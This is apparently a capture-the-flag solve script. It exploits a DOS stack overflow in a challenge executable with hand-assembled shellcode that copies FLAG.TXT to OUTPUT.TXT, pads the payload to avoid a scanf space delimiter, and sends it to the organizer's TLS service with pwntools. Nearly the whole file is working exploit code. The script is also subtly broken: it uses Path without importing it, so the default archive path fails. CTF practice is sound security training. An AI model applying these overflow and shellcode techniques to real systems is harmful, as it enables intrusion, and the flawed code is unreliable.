#!/usr/bin/env python3
"""Recover the End of Life flag from the organizer's TLS service."""
import argparse
import base64
import re
import struct
import zipfile

from pwn import context, remote

SEGMENT_OFF = 0x200
CS_DS_DELTA = 0x23F0


def make_payload(exe: bytes) -> bytes:
    """Build a DOS stack overflow and place its code in the CS:23F0 data alias."""
    code = bytearray()
    dx_immediates = []

    def mov_dx_placeholder() -> None:
        code.append(0xBA)  # mov dx, imm16
        dx_immediates.append(len(code))
        code.extend(b"\x00\x00")

    # Open FLAG.TXT read-only; create OUTPUT.TXT; copy the flag into it.
    mov_dx_placeholder()
    code.extend(b"\x30\xC0\xB4\x3D\xCD\x21\x93")  # xor al,al; open; xchg ax,bx
    mov_dx_placeholder()
    code.extend(b"\x31\xC9\xB4\x3C\xCD\x21\x97")  # create; xchg ax,di
    mov_dx_placeholder()
    code.extend(b"\xB9\x00\x01\xB4\x3F\xCD\x21\x91\x89\xFB")
    mov_dx_placeholder()
    code.extend(b"\xB4\x40\xCD\x21\xB8\x00\x4C\xCD\x21")

    flag_name = SEGMENT_OFF + len(code)
    output_name = flag_name + len(b"FLAG.TXT\0")
    buffer = output_name + len(b"OUTPUT.TXT\0")
    for immediate, value in zip(dx_immediates, (flag_name, output_name, buffer, buffer)):
        code[immediate:immediate + 2] = struct.pack("<H", value)
    shellcode = bytes(code) + b"FLAG.TXT\0OUTPUT.TXT\0" + bytes(256)
    if b" " in shellcode:
        raise ValueError("shellcode contains the scanf delimiter")

    # DS:0000 aliases CS:23F0. Preserve the loaded data up to offset 0x200,
    # replacing only spaces so the scanset consumes the entire overflow.
    data = bytearray(exe[512 + CS_DS_DELTA:512 + CS_DS_DELTA + SEGMENT_OFF])
    if len(data) != SEGMENT_OFF:
        raise ValueError("unexpected CHALL.EXE layout")
    data = bytes(0x21 if byte == 0x20 else byte for byte in data)

    payload = (
        b"a" * 16 + b"\x1aXYZ"
        + struct.pack("<H", CS_DS_DELTA + SEGMENT_OFF)
        + b"B" * 10 + data + shellcode
    )
    if b" " in payload:
        raise ValueError("payload contains the scanf delimiter")
    return payload


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=None)
    parser.add_argument("-p", "--port", type=int, default=None)
    parser.add_argument("--exe", default=None, help="CHALL.EXE path; otherwise read handout.zip")
    args = parser.parse_args()
    import os
    host = args.host or os.environ.get("HOST")
    port = args.port or int(os.environ.get("PORT", "1337"))
    if not host:
        raise SystemExit("usage: solve.py HOST [-p PORT] (or set HOST and PORT)")

    if args.exe:
        with open(args.exe, "rb") as f:
            exe = f.read()
    else:
        archive_path = Path(__file__).resolve().parent / "files" / "handout.zip"
        with zipfile.ZipFile(archive_path) as archive:
            name = next(n for n in archive.namelist() if n.upper().endswith("CHALL.EXE"))
            exe = archive.read(name)

    context.log_level = "error"
    io = remote(host, port, ssl=True, sni=host)
    io.recvuntil(b": ")
    io.sendline(base64.b64encode(make_payload(exe)))
    response = io.recvall(timeout=12)
    io.close()
    match = re.search(rb"Your OUTPUT\.TXT: ([A-Za-z0-9+/=]+)", response)
    if not match:
        raise SystemExit(response.decode(errors="replace"))
    result = base64.b64decode(match.group(1)).decode(errors="replace").strip()
    if not re.fullmatch(r"FortID\{[^}\r\n]+\}", result):
        raise SystemExit(f"unexpected OUTPUT.TXT: {result!r}")
    print(result)


if __name__ == "__main__":
    main()
